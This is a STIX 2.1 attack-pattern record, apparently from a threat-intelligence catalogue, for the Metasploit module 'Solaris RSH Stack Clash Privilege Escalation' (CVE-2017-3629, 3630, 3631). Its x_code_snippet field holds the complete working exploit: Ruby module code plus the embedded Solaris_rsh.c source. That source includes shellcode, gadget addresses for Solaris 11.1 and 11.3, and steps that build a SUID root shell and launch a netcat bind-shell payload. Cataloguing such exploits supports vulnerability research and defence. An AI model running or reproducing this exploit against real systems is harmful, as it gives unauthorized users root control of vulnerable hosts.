{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c9d1ba0e-4810-4508-a7dc-67ac4c769964",
    "created": "2024-08-14T16:34:01.490099Z",
    "modified": "2024-08-14T16:34:01.490103Z",
    "name": "Solaris RSH Stack Clash Privilege Escalation",
    "description": " This module exploits a vulnerability in RSH on unpatched Solaris systems which allows users to gain root privileges.  The stack guard page on unpatched Solaris systems is of insufficient size to prevent collisions between the stack and heap memory, aka Stack Clash.  This module uploads and executes Qualys' Solaris_rsh.c exploit which exploits a vulnerability in RSH to bypass the stack guard page to write to the stack and create a SUID root shell.  This module has offsets for Solaris versions 11.1 (x86) and Solaris 11.3 (x86).  Exploitation will usually complete within a few minutes using the default number of worker threads (10). Occasionally exploitation will fail. If the target system is vulnerable usually re-running the exploit will be successful.  This module has been tested successfully on Solaris 11.1 (x86) and Solaris 11.3 (x86).  'References'     => [ ['BID', '99151'] ['BID', '99153']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/local/rsh_stack_clash_priv_esc.rb",
            "external_id": "rsh_stack_clash_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-3629"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-3630"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-3631"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-3629-3757403.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.qualys.com/securitylabs/2017/06/19/the-stack-clash"
        },
        {
            "source_name": "reference",
            "url": "https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Solaris::Priv\n  include Msf::Post::Solaris::System\n  include Msf::Post::Solaris::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris RSH Stack Clash Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a vulnerability in RSH on unpatched Solaris\n        systems which allows users to gain root privileges.\n\n        The stack guard page on unpatched Solaris systems is of\n        insufficient size to prevent collisions between the stack\n        and heap memory, aka Stack Clash.\n\n        This module uploads and executes Qualys' Solaris_rsh.c exploit,\n        which exploits a vulnerability in RSH to bypass the stack guard\n        page to write to the stack and create a SUID root shell.\n\n        This module has offsets for Solaris versions 11.1 (x86) and\n        Solaris 11.3 (x86).\n\n        Exploitation will usually complete within a few minutes using\n        the default number of worker threads (10). Occasionally,\n        exploitation will fail. If the target system is vulnerable,\n        usually re-running the exploit will be successful.\n\n        This module has been tested successfully on Solaris 11.1 (x86)\n        and Solaris 11.3 (x86).\n      },\n      'References'     =>\n        [\n          ['BID', '99151'],\n          ['BID', '99153'],\n          ['CVE', '2017-1000364'],\n          ['CVE', '2017-3629'],\n          ['CVE', '2017-3630'],\n          ['CVE', '2017-3631'],\n          ['EDB', '42270'],\n          ['URL', 'http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-3629-3757403.html'],\n          ['URL', 'https://blog.qualys.com/securitylabs/2017/06/19/the-stack-clash'],\n          ['URL', 'https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt']\n        ],\n      'Notes'          => { 'AKA' => ['Stack Clash', 'Solaris_rsh.c'] },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Qualys Corporation', # Stack Clash technique and Solaris_rsh.c exploit\n          'bcoles'       # Metasploit\n        ],\n      'DisclosureDate' => '2017-06-19',\n      'Privileged'     => true,\n      'Platform'       => ['unix'],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        =>\n        [\n          ['Automatic', {}],\n          ['Solaris 11.1', {}],\n          ['Solaris 11.3', {}]\n        ],\n      'DefaultOptions' =>\n        {\n          'PAYLOAD'     => 'cmd/unix/bind_netcat',\n          'WfsDelay'    => 10,\n          'PrependFork' => true\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptInt.new('WORKERS', [true, 'Number of workers', '10']),\n      OptString.new('RSH_PATH', [true, 'Path to rsh executable', '/usr/bin/rsh'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def rsh_path\n    datastore['RSH_PATH']\n  end\n\n  def mkdir(path)\n    vprint_status \"Creating '#{path}' directory\"\n    cmd_exec \"mkdir -p #{path}\"\n    register_dir_for_cleanup path\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n\n    output = cmd_exec \"PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/:/opt/csw/bin gcc -Wall -std=gnu99 -o #{path} #{path}.c\"\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    register_file_for_cleanup path\n  end\n\n  def symlink(link_target, link_name)\n    print_status \"Symlinking #{link_target} to #{link_name}\"\n    rm_f link_name\n    cmd_exec \"ln -sf #{link_target} #{link_name}\"\n    register_file_for_cleanup link_name\n  end\n\n  def check\n    unless setuid? rsh_path\n      vprint_error \"#{rsh_path} is not setuid\"\n      return CheckCode::Safe\n    end\n    vprint_good \"#{rsh_path} is setuid\"\n\n    unless has_gcc?\n      vprint_error 'gcc is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'gcc is installed'\n\n    version = kernel_version\n    if version.to_s.eql? ''\n      vprint_error 'Could not determine Solaris version'\n      return CheckCode::Detected\n    end\n\n    unless ['11.1', '11.3'].include? version\n      vprint_error \"Solaris version #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Solaris version #{version} appears to be vulnerable\"\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    if target.name.eql? 'Automatic'\n      case kernel_version\n      when '11.1'\n        my_target = targets[1]\n        arg = 0\n      when '11.3'\n        my_target = targets[2]\n        arg = 1\n      else\n        fail_with Failure::NoTarget, 'Unable to automatically select a target'\n      end\n    else\n      my_target = target\n    end\n    print_status \"Using target: #{my_target.name}\"\n\n    base_path = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}\"\n    mkdir base_path\n\n    # Solaris_rsh.c by Qualys\n    # modified for Metasploit\n    workers = datastore['WORKERS'].to_i\n    root_shell = 'ROOT'\n    shellcode = '\\x31\\xc0\\x50\\x68'\n    shellcode << root_shell\n    shellcode << '\\x89\\xe3\\x50\\x53\\x89\\xe2\\x50\\x50'\n    shellcode << '\\x52\\x53\\xb0\\x3C\\x48\\x50\\xcd\\x91'\n    shellcode << '\\x31\\xc0\\x40\\x50\\x50\\xcd\\x91Z'\n    exp = <<-EOF\n/*\n * Solaris_rsh.c for CVE-2017-3630, CVE-2017-3629, CVE-2017-3631\n * Copyright (C) 2017 Qualys, Inc.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include <errno.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/fcntl.h>\n#include <sys/resource.h>\n#include <sys/stat.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n\n#ifndef timersub\n#define timersub(a, b, result) \\\\\n    do { \\\\\n        (result)->tv_sec = (a)->tv_sec - (b)->tv_sec; \\\\\n        (result)->tv_usec = (a)->tv_usec - (b)->tv_usec; \\\\\n        if ((result)->tv_usec < 0) { \\\\\n            --(result)->tv_sec; \\\\\n            (result)->tv_usec += 1000000; \\\\\n        } \\\\\n    } while (0)\n#endif\n\n#define RSH \"#{rsh_path}\"\nstatic const struct target * target;\nstatic const struct target {\n    const char * name;\n    size_t s_first, s_last, s_step;\n    size_t l_first, l_last, l_step;\n    size_t p_first, p_last, p_step;\n    size_t a, b;\n    size_t i, j;\n}\ntargets[] = {\n    {\n        .name = \"Oracle Solaris 11.1 X86 (Assembled 19 September 2012)\",\n        .s_first = 16*1024, .s_last = 44*1024, .s_step = 4096,\n        .l_first = 192,     .l_last = 512,     .l_step = 16,\n        .p_first = 0,       .p_last = 8192,    .p_step = 1,\n        .a = 0,             .b = 15,           .j = 12,\n        .i = 0x08052608 /* pop edx; pop ebp; ret */\n    },\n    {\n        .name = \"Oracle Solaris 11.3 X86 (Assembled 06 October 2015)\",\n        .s_first = 12*1024, .s_last = 44*1024, .s_step = 4096,\n        .l_first = 96,      .l_last = 512,     .l_step = 4,\n        .p_first = 0,       .p_last = 4096,    .p_step = 4,\n        .a = 0,             .b = 3,            .j = SIZE_MAX,\n        .i = 0x07faa7ea /* call *0xc(%ebp) */\n    },\n};\n\n#define ROOTSHELL \"#{root_shell}\"\nstatic const char shellcode[] = \"#{shellcode}\";\n\nstatic volatile sig_atomic_t sigalarm;\n\nstatic void\nsigalarm_handler(const int signum __attribute__((__unused__)))\n{\n    sigalarm = 1;\n}\n\n#define die() do { \\\\\n    fprintf(stderr, \"died in %s: %u\\\\n\", __func__, __LINE__); \\\\\n    exit(EXIT_FAILURE); \\\\\n} while (0)\n\nstatic int\nis_suid_root(const char * const file)\n{\n    if (!file) die();\n    static struct stat sbuf;\n    if (stat(file, &sbuf)) die();\n    if (!S_ISREG(sbuf.st_mode)) die();\n    return ((sbuf.st_uid == 0) && (sbuf.st_mode & S_ISUID));\n}\n\nstatic const char *\nbuild_lca(const size_t l)\n{\n    static const size_t shellcode_len = sizeof(shellcode)-1;\n    if (shellcode_len > 64) die();\n    if (shellcode_len % 16) die();\n    if (l < shellcode_len + target->a + target->b) die();\n\n    #define LCA_MAX 4096\n    if (l > LCA_MAX) die();\n    static char lca[128 + LCA_MAX];\n    strcpy(lca, \"LC_ALL=\");\n    char * cp = memchr(lca, '\\\\0', sizeof(lca));\n    if (!cp) die();\n    memcpy(cp, shellcode, shellcode_len);\n    cp += shellcode_len;\n    memset(cp, 'a', target->a);\n\n    size_t o;\n    for (o = target->a; l - o >= 4; o += 4) {\n        if ((o - target->a) % 16 == target->j) {\n            cp[o + 0] = '\\\\xeb';\n            cp[o + 1] = (o - target->a >= 16) ? -(16u + 2u) :\n                -(shellcode_len + target->a + target->j + 2);\n            cp[o + 2] = 'j';\n            cp[o + 3] = 'j';\n        } else {\n            if (sizeof(size_t) != 4) die();\n            *(size_t *)(cp + o) = target->i;\n        }\n    }\n    cp += o;\n    memset(cp, 'b', target->b);\n    cp[target->b] = '\\\\0';\n    if (strlen(lca) != 7 + shellcode_len + o + target->b) die();\n    return lca;\n}\n\nstatic const char *\nbuild_pad(const size_t p)\n{\n    #define PAD_MAX 8192\n    if (p > PAD_MAX) die();\n    static char pad[64 + PAD_MAX];\n    strcpy(pad, \"P=\");\n    char * const cp = memchr(pad, '\\\\0', sizeof(pad));\n    if (!cp) die();\n    memset(cp, 'p', p);\n    cp[p] = '\\\\0';\n    if (strlen(pad) != 2 + p) die();\n    return pad;\n}\n\nstatic void\nfork_worker(const size_t s, const char * const lca, const char * const pad)\n{\n    #define N_WORKERS #{workers.to_i}\n    static size_t n_workers;\n    static struct {\n        pid_t pid;\n        struct timeval start;\n    } workers[N_WORKERS];\n\n    size_t i_worker;\n    struct timeval start, stop, diff;\n\n    if (n_workers >= N_WORKERS) {\n        if (n_workers != N_WORKERS) die();\n        int is_suid_rootshell = 0;\n        for (;;) {\n            sigalarm = 0;\n            #define TIMEOUT 10\n            alarm(TIMEOUT);\n            int status = 0;\n            const pid_t pid = waitpid(-1, &status, WUNTRACED);\n            alarm(0);\n            if (gettimeofday(&stop, NULL)) die();\n\n            if (pid <= 0) {\n                if (pid != -1) die();\n                if (errno != EINTR) die();\n                if (sigalarm != 1) die();\n            }\n            int found_pid = 0;\n            for (i_worker = 0; i_worker < N_WORKERS; i_worker++) {\n                const pid_t worker_pid = workers[i_worker].pid;\n                if (worker_pid <= 0) die();\n                if (worker_pid == pid) {\n                    if (found_pid) die();\n                    found_pid = 1;\n                    if (WIFEXITED(status) || WIFSIGNALED(status))\n                        workers[i_worker].pid = 0;\n                } else {\n                    timersub(&stop, &workers[i_worker].start, &diff);\n                    if (diff.tv_sec >= TIMEOUT)\n                        if (kill(worker_pid, SIGKILL)) die();\n                }\n            }\n            if (!found_pid) {\n                if (pid != -1) die();\n                continue;\n            }\n            if (WIFEXITED(status)) {\n                if (WEXITSTATUS(status) != EXIT_FAILURE)\n                    fprintf(stderr, \"exited %d\\\\n\", WEXITSTATUS(status));\n                break;\n            } else if (WIFSIGNALED(status)) {\n                if (WTERMSIG(status) != SIGSEGV)\n                    fprintf(stderr, \"signal %d\\\\n\", WTERMSIG(status));\n                break;\n            } else if (WIFSTOPPED(status)) {\n                fprintf(stderr, \"stopped %d\\\\n\", WSTOPSIG(status));\n                is_suid_rootshell |= is_suid_root(ROOTSHELL);\n                if (kill(pid, SIGKILL)) die();\n                continue;\n            }\n            fprintf(stderr, \"unknown %d\\\\n\", status);\n            die();\n        }\n        if (is_suid_rootshell) {\n            system(\"ls -lL \" ROOTSHELL);\n            exit(EXIT_SUCCESS);\n        }\n        n_workers--;\n    }\n    if (n_workers >= N_WORKERS) die();\n\n    static char rsh_link[64];\n    if (*rsh_link != '/') {\n        const int rsh_fd = open(RSH, O_RDONLY);\n        if (rsh_fd <= STDERR_FILENO) die();\n        if ((unsigned int)snprintf(rsh_link, sizeof(rsh_link),\n            \"/proc/%ld/fd/%d\", (long)getpid(), rsh_fd) >= sizeof(rsh_link)) die();\n        if (access(rsh_link, R_OK | X_OK)) die();\n        if (*rsh_link != '/') die();\n    }\n\n    static int null_fd = -1;\n    if (null_fd <= -1) {\n        null_fd = open(\"/dev/null\", O_RDWR);\n        if (null_fd <= -1) die();\n    }\n\n    const pid_t pid = fork();\n    if (pid <= -1) die();\n    if (pid == 0) {\n        const struct rlimit stack = { s, s };\n        if (setrlimit(RLIMIT_STACK, &stack)) die();\n\n        if (dup2(null_fd, STDIN_FILENO) != STDIN_FILENO) die();\n        if (dup2(null_fd, STDOUT_FILENO) != STDOUT_FILENO) die();\n        if (dup2(null_fd, STDERR_FILENO) != STDERR_FILENO) die();\n\n        static char * const argv[] = { rsh_link, \"-?\", NULL };\n        char * const envp[] = { (char *)lca, (char *)pad, NULL };\n        execve(*argv, argv, envp);\n        die();\n    }\n    if (gettimeofday(&start, NULL)) die();\n    for (i_worker = 0; i_worker < N_WORKERS; i_worker++) {\n        const pid_t worker_pid = workers[i_worker].pid;\n        if (worker_pid > 0) continue;\n        if (worker_pid != 0) die();\n        workers[i_worker].pid = pid;\n        workers[i_worker].start = start;\n        n_workers++;\n        return;\n    }\n    die();\n}\n\nint main(const int argc, const char * const argv[])\n{\n    static const struct rlimit core;\n    if (setrlimit(RLIMIT_CORE, &core)) die();\n\n    if (geteuid() == 0) {\n        if (is_suid_root(ROOTSHELL)) {\n            if (setuid(0)) die();\n            if (setgid(0)) die();\n            static char * const argv[] = { \"/bin/sh\", NULL };\n            execve(*argv, argv, NULL);\n            die();\n        }\n        chown(*argv, 0, 0);\n        chmod(*argv, 04555);\n        for (;;) {\n            raise(SIGSTOP);\n            sleep(1);\n        }\n        die();\n    }\n\n    const size_t i = strtoul(argv[1], NULL, 10);\n    if (i >= sizeof(targets)/sizeof(*targets)) die();\n    target = targets + i;\n    fprintf(stderr, \"Target %zu %s\\\\n\", i, target->name);\n\n    if (target->a >= 16) die();\n    if (target->b >= 16) die();\n    if (target->i <= 0) die();\n    if (target->j >= 16 || target->j % 4) {\n        if (target->j != SIZE_MAX) die();\n    }\n\n    static const struct sigaction sigalarm_action = { .sa_handler = sigalarm_handler };\n    if (sigaction(SIGALRM, &sigalarm_action, NULL)) die();\n\n    size_t s;\n    for (s = target->s_first; s <= target->s_last; s += target->s_step) {\n        if (s % target->s_step) die();\n\n        size_t l;\n        for (l = target->l_first; l <= target->l_last; l += target->l_step) {\n            if (l % target->l_step) die();\n            const char * const lca = build_lca(l);\n            fprintf(stdout, \"s %zu l %zu\\\\n\", s, l);\n\n            size_t p;\n            for (p = target->p_first; p <= target->p_last; p += target->p_step) {\n                if (p % target->p_step) die();\n                const char * const pad = build_pad(p);\n                fork_worker(s, lca, pad);\n            }\n        }\n    }\n    fprintf(stdout, \"Failed\\\\n\");\n}\n    EOF\n\n    exploit_name = \".#{rand_text_alphanumeric 5..15}\"\n    upload_and_compile \"#{base_path}/#{exploit_name}\", exp\n    symlink \"#{base_path}/#{exploit_name}\", \"#{base_path}/#{root_shell}\"\n\n    print_status \"Creating suid root shell. This may take a while...\"\n    cmd_exec \"cd #{base_path}\"\n    start = Time.now\n    output = cmd_exec \"./#{exploit_name} #{arg}\", nil, 1_800\n    stop = Time.now\n    print_status \"Completed in #{(stop - start).round(2)}s\"\n    unless output.include? 'root'\n      fail_with Failure::Unknown, \"Failed to create suid root shell: #{output}\"\n    end\n    print_good \"suid root shell created: #{base_path}/#{root_shell}\"\n\n    payload_name = \".#{rand_text_alphanumeric 5..10}\"\n    payload_path = \"#{base_path}/#{payload_name}\"\n    upload payload_path, payload.encoded\n    cmd_exec \"chmod +x '#{payload_path}'\"\n\n    print_status 'Executing payload...'\n    cmd_exec \"echo #{payload_path} | ./#{root_shell} & echo \"\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-06-19",
    "x_mitre_platforms": [
        "['unix']"
    ]
}